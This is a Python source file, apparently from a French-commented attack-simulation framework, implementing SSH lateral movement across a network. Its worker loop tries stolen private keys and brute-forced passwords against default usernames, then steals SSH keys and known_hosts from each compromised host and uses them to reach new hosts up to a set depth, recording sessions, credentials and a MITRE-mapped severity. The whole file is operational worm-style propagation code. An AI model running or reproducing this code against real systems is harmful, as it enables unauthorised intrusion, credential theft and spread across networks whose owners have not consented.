#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Sun May 24 05:37:02 2026

@author: hounsousamuel
"""

import os
import sys
sys.path.insert(1, os.path.dirname(os.path.abspath(os.path.join(__file__, "..", ".."))))

import time
import asyncio
from typing import Dict, Any, Optional, List
from uuid import uuid4
from tactics.execution.command_execution import CommandExecution
from tactics.initial_access.ssh_key_brute_force import SSHKeyBruteForce
from tactics.initial_access.ssh_brute_force import SSHBruteForce
from tactics.credential_access.ssh_key_theft import SSHKeyTheft
from tactics.lateral_movement.data.ssh_lateral_movement_helper import DEFAULT_USERNAMES
from tactics.mittres import MITRE
from simulateur_utils.logger import get_logger

logger = get_logger()

TYPE_MAP = {
    "openssh": "Ed25519", 
    "rsa":     "RSA",
    "ecdsa":   "ECDSA",
    "dsa":     "DSA",
    "pkcs8":   "RSA",
    "unknown": "RSA",
}

class SSHLateralMovement(CommandExecution):
    """
    Propagation latérale SSH via BFS.

    Cette classe implémente un BFS (Breadth First Search) pour se propager
    dans un réseau en utilisant :
        - Des clés SSH volées
        - Du brute force de mots de passe
        - Du vol de clés sur les machines compromises

    Le mouvement latéral se fait en plusieurs phases :
        1. Pour chaque hôte connu, tenter de se connecter avec les clés disponibles
        2. Sur succès, voler les clés SSH et les known_hosts
        3. Utiliser les nouvelles clés pour atteindre de nouveaux hôtes
        4. Répéter jusqu'à épuisement (max_depth, max_hosts)
    """

    def __init__(
        self,
        name: str = "ssh_lateral_movement",
        timeout: int = 2,
        exec_timeout: int = 10,
        max_depth: int = 3,
        max_workers: int = 5,
        get_timeout: float = 1.0,
        max_hosts: int = 50,
        delay: float = 0.5,
        max_attempts: int = 50,
        total_timeout: float | None = None,
        join_timeout: float | None = None,
        empty_await_between: float = 0.2,
        empty_max_count: int = 3,
        **kwargs
    ):
        """
        Initialise le propagateur latéral SSH.

        Args:
            name: Nom de l'instance.
            timeout: Timeout de connexion SSH.
            exec_timeout: Timeout d'exécution des commandes.
            max_depth: Profondeur BFS maximale (nombre de sauts).
            max_workers: Nombre de workers parallèles.
            get_timeout: Timeout d'attente sur la queue.
            max_hosts: Nombre maximum d'hôtes à compromettre.
            delay: Délai entre les tentatives de brute force.
            max_attempts: Nombre maximum de tentatives.
            total_timeout: Timeout global pour les sous-classes.
            join_timeout: Timeout pour l'attente de fin des workers.
            empty_await_between: Intervalle entre les vérifications de queue vide.
            empty_max_count: Nombre de vérifications consécutives avant arrêt.
            **kwargs: Arguments supplémentaires.
        """
        super().__init__(name=name, timeout=timeout, exec_timeout=exec_timeout, **kwargs)

        # Résultats
        self.lateral_result: Dict[str, Any] = {}
        self.sessions: Dict[str, List[Dict[str, Any]]] = {}
        self.all_keys: List[Dict] = []

        # Config workers
        self.max_depth = max_depth
        self.max_workers = max_workers
        self.get_timeout = get_timeout
        self.max_hosts = max_hosts
        self.join_timeout = join_timeout
        self.empty_await_between = empty_await_between
        self.empty_max_count = empty_max_count
        self.lock = asyncio.Lock()

        self.ssh_key_cls = SSHKeyBruteForce(
            timeout=timeout,
            delay=delay,
            max_attempts=max_attempts,
            total_timeout=total_timeout,
        )
        self.ssh_key_stoler = SSHKeyTheft(
            timeout=timeout,
            exec_timeout=exec_timeout,
        )
        self.ssh_brute_force = SSHBruteForce(
            timeout=timeout,
            max_attempts=max_attempts,
            delay=delay,
            total_timeout=total_timeout,
        )

        self.key_brute_force_result: Dict[str, List] = {}
        self.key_brute_force_found_result: Dict[str, List] = {}

    def combine_host_key(
        self,
        usable_keys: List[Dict],
        known_hosts: List[Dict],
        deep: int = 0,
    ):
        """Génère toutes les combinaisons (host, port, key, key_type, depth)."""
        # print(str(k["type"]).lower())
        # print(usable_keys[0])
        # input()
        keys = [(k["content"], TYPE_MAP.get(str(k["type"]).lower(), "RSA")) for k in usable_keys]
        for item in known_hosts:
            host = item["host"]
            port = item["port"]
            for key, key_type in keys:
                yield (host, port, key, key_type, deep)

    def _marker(self, host: str, port: int) -> str:
        """Génère un marqueur unique pour un hôte:port."""
        return f"{host}:{port}"

    def _compute_severity(self) -> str:
        """Calcule la sévérité en fonction du nombre d'hôtes compromis."""
        count = len(self.sessions)
        if count >= 3:
            return "CRITICAL"
        if count >= 1:
            return "HIGH"
        return "LOW"

    @staticmethod
    def stop_tasks(tasks: List[asyncio.Task]):
        """Annule proprement une liste de tâches asynchrones."""
        for task in tasks:
            try:
                task.cancel()
            except Exception:
                pass

    async def worker(
        self, 
        visited:set, 
        lock:asyncio.Lock,
        queue:asyncio.Queue,
        signal_queue:asyncio.Queue,
        worker_id:str = "",
    ):
        """
        Worker asynchrone traitant les éléments de la queue BFS.

        Args:
            visited: Ensemble des marqueurs d'hôtes déjà traités.
            lock: Verrou pour les accès aux structures partagées.
            queue: Queue contenant les éléments à traiter.
            signal_queue: Queue pour les signaux d'arrêt.
            worker_id: Identifiant du worker (pour les logs).
        """
        while True:
            get_item = False
            try:
                item = await asyncio.wait_for(
                    fut=queue.get(),
                    timeout=self.get_timeout
                )
                get_item = True
                if not item:
                    await signal_queue.put(None) 
                    break
                
                host, port, key, key_type, deep = item
                if deep >= self.max_depth:
                    continue
                
                marker = "{}:{}".format(host, port) 
                if marker in visited or \
                    len(visited) >= self.max_hosts:
                    continue
                
                async with lock:
                    visited.add(marker)

                ssh_key_brute_force_result = await self.ssh_key_cls.find_all_async(
                    ip=host,
                    port=port,
                    keys=[{"key_or_filename": key, "is_file": False, "algo": key_type}],
                    usernames=DEFAULT_USERNAMES,
                    add_common=True
                )
                founds = ssh_key_brute_force_result["founds"]  # Dict {raw_key: [list of dicts]}
                async with lock:
                    self.key_brute_force_result.setdefault(marker, []).append(ssh_key_brute_force_result)
                    self.key_brute_force_found_result.setdefault(marker, []).append(founds)
                
                key_founds = founds.get(key, [])  
                username = key_founds[0].get("username", "") if key_founds else ""
                password = ""
                stole_result = {
                    "known_hosts_count": 0,
                    "usable_keys_count": 0
                }

                if not key_founds:
                    # Tester brute force password
                    ssh_brute_force_result = await self.ssh_brute_force.find_all_async(
                        ip=host,
                        port=port,
                        usernames=DEFAULT_USERNAMES,
                        passwords=[],
                        add_common=True,
                    )
                    ssh_brute_force_result = ssh_brute_force_result["results"]["founds"]
                    if ssh_brute_force_result:
                        for bf_item in ssh_brute_force_result:
                            username = bf_item["username"]
                            password = bf_item["password"]
                            stole_result = await self.ssh_key_stoler.steal_async(
                                ip=host,
                                port=port,
                                password=password,
                                username=username,
                                total_timeout=None
                            )
                            stole_result = stole_result["results"]
                            if not (stole_result["known_hosts_count"] > 0 and stole_result["usable_keys_count"] > 0):
                                continue  # Si rien, réessayer avec le prochain cred
                            break  # Prendre le premier qui donne des résultats
                        
                else:
                    stole_result = await self.ssh_key_stoler.steal_async(
                        ip=host,
                        port=port,
                        username=username,
                        password=None,
                        pkey=key,
                        total_timeout=None
                    )
                    stole_result = stole_result["results"]
                
                if stole_result and \
                    (stole_result["known_hosts_count"] > 0 and stole_result["usable_keys_count"] > 0):
                        async with lock:
                            self.sessions.setdefault(marker, []).append({
                                "host": host,
                                "port": port,
                                "username": username,
                                "key_content": key if not password else None,
                                "password": password,
                                "auth_method": "key" if not password else "password",
                                "stole_result": stole_result
                            })
                            self.all_keys.extend(stole_result.get("usable_keys", []))

                        for new_item in self.combine_host_key(
                                usable_keys=stole_result["usable_keys"],
                                known_hosts=stole_result["known_hosts"],
                                deep=deep + 1
                            ):
                            if "{}:{}".format(new_item[0], new_item[1]) in visited:
                                continue
                            async with lock:
                                await queue.put(new_item)
                    
            except asyncio.TimeoutError:
                async with lock:
                    if queue.empty():  
                        for _ in range(self.max_workers):
                            await queue.put(None)
                await signal_queue.put(None)
                break
            
            except asyncio.CancelledError:
                self.log(f"Worker {worker_id} annulé", log=True)
                await signal_queue.put(None)
                break
            
            except asyncio.QueueEmpty:
                self.log("Queue vide !", log=True)
                await signal_queue.put(None)
                break
            
            except KeyboardInterrupt:
                break
            
            except Exception as e:
                self.log(f"Erreur dans worker {worker_id}: {str(e)}", log=True)
                import traceback
                traceback.print_exc()
            
            finally:
                if get_item:
                    queue.task_done()
                
                await asyncio.sleep(0.00001)
                    
    async def propagate_async(
        self,
        usable_keys: List[Dict],
        known_hosts: List[Dict],
    ) -> Dict[str, Any]:
        """
        Lance la propagation latérale BFS.

        Args:
            usable_keys: Clés initiales utilisables.
                Chaque dict doit contenir "content" (la clé) et "type".
            known_hosts: Hôtes initiaux connus.
                Chaque dict doit contenir "host" et "port".

        Returns:
            Dict contenant severity, elapsed, mitres, et results (sessions,
            sessions_count, total_keys_collected).
        """
        self.start_time = time.time()
        self.log(
            f"Début propagation — {len(usable_keys)} clé(s), "
            f"{len(known_hosts)} host(s) initiaux",
            log=True
        )

        # Seed initial : toutes les combinaisons (host, port, key, type, depth=0)
        queue = asyncio.Queue()
        signal_queue = asyncio.Queue()
        visited = set()

        for item in self.combine_host_key(usable_keys, known_hosts, 0):
            await queue.put(item)

        if queue.qsize() == 0:
            self.log("Aucune combinaison host/clé à tester", log=True)
            self.end_time = time.time()
            return self._get_result()

        uuid = str(uuid4())
        tasks = [
            asyncio.create_task(
                coro=self.worker(
                    queue=queue,
                    signal_queue=signal_queue,
                    lock=self.lock,
                    visited=visited,
                    worker_id=f"{uuid}__{i}",
                ),
                name=f"{uuid}__{i}",
            )
            for i in range(self.max_workers)
        ]

        async def monitor_queue():
            empty_count = 0
            while True:
                await asyncio.sleep(self.empty_await_between)
                try:
                    item = signal_queue.get_nowait()
                    if item is None:
                        self.log("🚨 Signal d'arrêt reçu", log=True)
                        raise asyncio.TimeoutError("Signal d'arrêt worker")
                except asyncio.QueueEmpty:
                    pass

                if queue.empty():
                    empty_count += 1
                else:
                    empty_count = 0

                if empty_count >= self.empty_max_count:
                    self.log("📭 Queue vide — arrêt normal", log=True)
                    raise asyncio.QueueEmpty("Queue vide")

        monitor_task = asyncio.create_task(monitor_queue())
        join_task = asyncio.create_task(
            asyncio.wait_for(queue.join(), self.join_timeout)
        )
        pending = set()

        try:
            done, pending = await asyncio.wait(
                [monitor_task, join_task],
                timeout=self.join_timeout,
                return_when=asyncio.FIRST_EXCEPTION,
            )
            for task in done:
                task.result()
            self.log("✅ Queue vidée normalement", log=True)

        except (asyncio.TimeoutError, asyncio.QueueEmpty) as e:
            if isinstance(e, asyncio.TimeoutError):
                self.log(f"Timeout join atteint ({self.join_timeout}s)", log=True)
            else:
                self.log("Queue vide — propagation terminée", log=True)

            # Vider la queue proprement
            while not queue.empty():
                try:
                    queue.get_nowait()
                    queue.task_done()
                except asyncio.QueueEmpty:
                    break

        except Exception as e:
            self.log(f"Erreur propagation : {e}", log=True)

        finally:
            self.stop_tasks(tasks)
            if pending:
                self.stop_tasks(list(pending))
                await asyncio.gather(*pending, return_exceptions=True)
            # Signal d'arrêt aux workers encore actifs
            for _ in range(self.max_workers):
                await queue.put(None)
            await asyncio.gather(*tasks, return_exceptions=True)
            try:
                monitor_task.cancel()
            except Exception:
                pass

        self.end_time = time.time()
        self.log(
            f"Propagation terminée — {len(self.sessions)} host(s) compromis",
            log=True
        )
        return self._get_result()

    def propagate_sync(self, *args, **kwargs) -> Dict[str, Any]:
        """Version synchrone de propagate_async."""
        return asyncio.run(self.propagate_async(*args, **kwargs))

    def _get_result(self) -> Dict[str, Any]:
        """Formate le résultat final de la propagation."""
        self.save()
        return {
            "severity": self._compute_severity(),
            "elapsed": self.end_time - self.start_time if self.end_time and self.start_time else 0,
            "mitres": [MITRE.get("SSHLateralMovement", {})],
            "results": {
                "sessions": self.sessions,
                "sessions_count": len(self.sessions),
                "total_keys_collected": len(self.all_keys),
            },
        }



def test_ssh_lateral_movement(
    usable_keys: List[Dict] = None,
    known_hosts: List[Dict] = None,
):
    """
    Fonction de test pour SSHLateralMovement.

    Args:
        usable_keys: Clés initiales. Par défaut [].
        known_hosts: Hôtes initiaux. Par défaut [].
    """
    print("\n🕸️  Test SSHLateralMovement")
    print("-" * 50)

    lateral = SSHLateralMovement(
        timeout=5,
        exec_timeout=10,
        max_depth=3,
        max_workers=5,
        join_timeout=60.0,
    )
    result = lateral.propagate_sync(
        usable_keys=usable_keys or [],
        known_hosts=known_hosts or [],
    )

    severity = result.get("severity", "UNKNOWN")
    icon = {"CRITICAL": "🔴", "HIGH": "🟠", "MEDIUM": "🟡", "LOW": "🟢"}.get(severity, "⚪")
    r = result.get("results", {})

    print(f"\n{icon} Sévérité : {severity}")
    print(f"⏱️  Temps : {result.get('elapsed', 0):.2f}s")
    print(f"💻 Hosts compromis : {r.get('sessions_count', 0)}")
    for marker, info in r.get("sessions", {}).items():
        print(f"   ✅ {marker} — {info['username']} ({info['auth_method']})")
    print(f"🔑 Clés collectées au total : {r.get('total_keys_collected', 0)}")

    return result


if __name__ == "__main__":
    test_ssh_lateral_movement()